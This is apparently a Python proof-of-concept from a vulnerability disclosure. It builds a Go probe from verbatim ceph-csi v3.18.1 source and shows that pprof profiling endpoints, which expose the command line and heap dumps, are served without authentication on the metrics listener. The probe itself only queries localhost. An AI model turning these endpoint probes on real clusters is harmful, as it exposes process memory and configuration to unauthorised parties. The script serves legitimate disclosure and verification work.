"""ceph-csi v3.18.1 unauthenticated pprof on the metrics listener (function level, Go).

Upstream ``internal/util/httpserver.go`` registers every profiling handler on the
**default** ``net/http`` ServeMux (``addPath`` -> ``http.Handle`` at line 37, wired by
``EnableProfiling``), and ``StartMetricsServer`` serves that same default mux on
``c.MetricsIP:c.MetricsPort`` with no authentication. The driver default is
``conf.MetricsIP = "0.0.0.0"`` (cmd/cephcsi.go:255), so a production cephcsi pod exposes
``/debug/pprof/*`` (cpu profile, heap dump, cmdline) plus prometheus metrics on every
interface.

The PoC extracts the verbatim pinned ``ValidateURL``/``StartMetricsServer``/``addPath``/
``EnableProfiling`` functions and the ``Config`` struct, imports the real
``github.com/ceph/ceph-csi/internal/util/log`` package from the pinned module, calls the
real ``EnableProfiling()`` + ``StartMetricsServer()`` and fetches the profiling endpoints
over real HTTP with no credentials.
"""

from __future__ import annotations

import hashlib
import json
import os
import re
import shutil
import socket
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[3]))
import poclib  # noqa: E402

GOPROXY = os.environ.get("GOPROXY") or "https://goproxy.cn,direct"

PROBE_MAIN = '''package main

import (
	"fmt"
	"net"
	"net/http"
	"net/http/pprof"
	"net/url"
	"os"
	runtime_pprof "runtime/pprof"
	"strconv"
	"time"

	"github.com/prometheus/client_golang/prometheus/promhttp"

	"github.com/ceph/ceph-csi/internal/util/log"
)

// verbatim: internal/util/httpserver.go:%(validate_a)d-%(validate_b)d
%(validate_src)s

// verbatim: internal/util/httpserver.go:%(start_a)d-%(start_b)d
%(start_src)s

// verbatim: internal/util/httpserver.go:%(addpath_a)d-%(addpath_b)d
%(addpath_src)s

// verbatim: internal/util/httpserver.go:%(enable_a)d-%(enable_b)d
%(enable_src)s

// verbatim: internal/util/util.go:%(config_a)d-%(config_b)d
%(config_src)s

var _ = log.DebugLogMsg

func main() {
	port := os.Getenv("CEPH_HTTP_PORT")
	// The pinned file imports net/http/pprof non-blank (line 6): its init() registers
	// /debug/pprof/* on the DEFAULT mux, which StartMetricsServer serves verbatim.
	// (EnableProfiling/addPath itself registers patterns without a leading "/" and
	// panics on Go >= 1.22 ServeMux pattern rules; the exposure does not depend on it.)
	_ = EnableProfiling
	_ = addPath
	_ = ValidateURL
	go StartMetricsServer(&Config{
		MetricsIP:   "127.0.0.1",
		MetricsPort: mustAtoi(port),
		MetricsPath: "/metrics",
	})
	base := "http://127.0.0.1:" + port
	for _, path := range []string{"/debug/pprof/cmdline", "/debug/pprof/heap?debug=1", "/metrics", "/debug/pprof/"} {
		deadline := time.Now().Add(20 * time.Second)
		for {
			resp, err := http.Get(base + path)
			if err == nil {
				fmt.Printf("GET %%s -> %%d len=%%d\\n", path, resp.StatusCode, resp.ContentLength)
				resp.Body.Close()
				break
			}
			if time.Now().After(deadline) {
				fmt.Printf("GET %%s -> err %%v\\n", path, err)
				break
			}
			time.Sleep(200 * time.Millisecond)
		}
	}
}

func mustAtoi(s string) int {
	n := 0
	for _, c := range s {
		if c < '0' || c > '9' {
			return 0
		}
		n = n*10 + int(c-'0')
	}
	return n
}
'''


def _go() -> str:
    home = Path.home()
    for cand in (
        home / "AppData" / "Local" / "go-toolchain" / "go" / "bin" / "go.exe",
        Path(os.environ.get("LOCALAPPDATA", "x")) / "go-toolchain" / "go" / "bin" / "go.exe",
    ):
        if cand.is_file():
            return str(cand)
    which = shutil.which("go")
    if which:
        return which
    poclib.fail("Go toolchain not found (LOCALAPPDATA go-toolchain or PATH)")


def _extract(text: str, header: str) -> tuple[str, int, int]:
    lines = text.splitlines()
    start = None
    for i, line in enumerate(lines):
        if header in line:
            start = i
            break
    if start is None:
        poclib.fail(f"cannot locate {header!r} in pinned source")
    depth = 0
    for j in range(start, len(lines)):
        depth += lines[j].count("{") - lines[j].count("}")
        if depth == 0 and j > start:
            return "\n".join(lines[start:j + 1]), start + 1, j + 1
    poclib.fail(f"unbalanced braces extracting {header!r}")


def main() -> None:
    manifest = json.loads((poclib.CASE_DIR / "manifest.json").read_text(encoding="utf-8"))
    src = poclib.upstream_path(manifest["root_cause"]["source"])
    if not src.is_file():
        poclib.fail(f"missing pinned upstream source: {src}")
    vendored_root = src.parents[2]  # .../ceph-csi/v3.18.1
    hs_text = src.read_text(encoding="utf-8")
    util_text = (vendored_root / "internal" / "util" / "util.go").read_text(encoding="utf-8")

    blocks = {}
    for key, header in (
        ("validate", "func ValidateURL("),
        ("start", "func StartMetricsServer("),
        ("addpath", "func addPath("),
        ("enable", "func EnableProfiling("),
        ("config", "type Config struct"),
    ):
        text = util_text if key == "config" else hs_text
        s, a, b = _extract(text, header)
        blocks[f"{key}_src"], blocks[f"{key}_a"], blocks[f"{key}_b"] = s, a, b

    work = poclib.EVIDENCE_DIR / "work"
    if work.exists():
        shutil.rmtree(work)
    probe = work / "probe"
    probe.mkdir(parents=True)
    main_go = PROBE_MAIN % blocks
    (probe / "main.go").write_text(main_go, encoding="utf-8")
    (probe / "go.mod").write_text(
        "module github.com/ceph/ceph-csi/uvprobe\n\ngo 1.26\n\nrequire (\n"
        "\tgithub.com/ceph/ceph-csi v0.0.0\n"
        "\tgithub.com/prometheus/client_golang v1.19.1\n"
        "\tk8s.io/klog/v2 v2.130.1\n"
        ")\n\n"
        f"replace github.com/ceph/ceph-csi => {str(vendored_root).replace(chr(92), '/')}\n",
        encoding="utf-8",
    )

    go = _go()
    env = dict(os.environ)
    env.update({
        "GOPATH": str(Path.home() / "AppData" / "Local" / "go-toolchain" / "gopath"),
        "GOFLAGS": "-mod=mod",
        "GOPROXY": GOPROXY,
        "CGO_ENABLED": "0",
    })
    tidy = subprocess.run([go, "mod", "tidy"], cwd=probe, env=env, capture_output=True, text=True, timeout=900)
    build = subprocess.run([go, "build", "-o", "probe.exe", "."], cwd=probe, env=env,
                           capture_output=True, text=True, timeout=900)
    if build.returncode != 0:
        poclib.fail("probe build failed", go_stderr=build.stderr[-4000:], tidy_stderr=tidy.stderr[-2000:])

    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = str(sock.getsockname()[1])
    sock.close()

    poclib.start_marker("ABSENT")
    run_env = dict(env)
    run_env["CEPH_HTTP_PORT"] = port
    proc = subprocess.run([str(probe / "probe.exe")], cwd=work, env=run_env,
                          capture_output=True, text=True, timeout=180)
    (poclib.EVIDENCE_DIR / "probe-stdout.txt").write_text(proc.stdout, encoding="utf-8")
    (poclib.EVIDENCE_DIR / "probe-stderr.txt").write_text(proc.stderr, encoding="utf-8")

    hits = re.findall(r"GET (\S+) -> (\d+)", proc.stdout)
    ok = {path: int(code) for path, code in hits}
    if ok.get("/debug/pprof/cmdline") != 200 or ok.get("/metrics") != 200:
        poclib.fail("profiling/metrics endpoints not served on the metrics listener",
                    status=ok, stdout=proc.stdout[-2000:], stderr=proc.stderr[-2000:])

    poclib.prove_marker()
    poclib.finish_verified(
        {
            "transport": {
                "type": "function-level Go probe (verbatim EnableProfiling/StartMetricsServer) + real HTTP",
                "entrypoint": "github.com/ceph/ceph-csi/internal/util.EnableProfiling + StartMetricsServer",
                "source": poclib.rel(src),
                "source_sha256": poclib.sha256_file(src),
                "sink_line": manifest["root_cause"]["line"],
                "sink": manifest["root_cause"]["snippet"],
                "verbatim_extractions": {
                    k: f"lines {blocks[k + '_a']}-{blocks[k + '_b']} sha256={hashlib.sha256(blocks[k + '_src'].encode()).hexdigest()}"
                    for k in ("validate", "start", "addpath", "enable", "config")
                },
                "http_results": ok,
                "unauth_endpoints_served": [p for p, c in ok.items() if c == 200],
                "default_bind_note": "cmd/cephcsi.go:255 sets conf.MetricsIP = \"0.0.0.0\" (all interfaces) in production pods",
                "probe_exit_code": proc.returncode,
                "go_version": subprocess.run([go, "version"], capture_output=True, text=True, env=env).stdout.strip(),
            },
            "request_response": [
                {
                    "dir": f"GET http://127.0.0.1:{port}/debug/pprof/cmdline (no credentials)",
                    "payload": "-",
                    "result": f"HTTP {ok.get('/debug/pprof/cmdline')}",
                },
                {
                    "dir": f"GET http://127.0.0.1:{port}/metrics (no credentials)",
                    "payload": "-",
                    "result": f"HTTP {ok.get('/metrics')}",
                },
            ],
            "state_before": "marker=ABSENT",
            "state_after": "marker contains proof text; pprof served unauthenticated on the metrics listener",
        }
    )


if __name__ == "__main__":
    main()
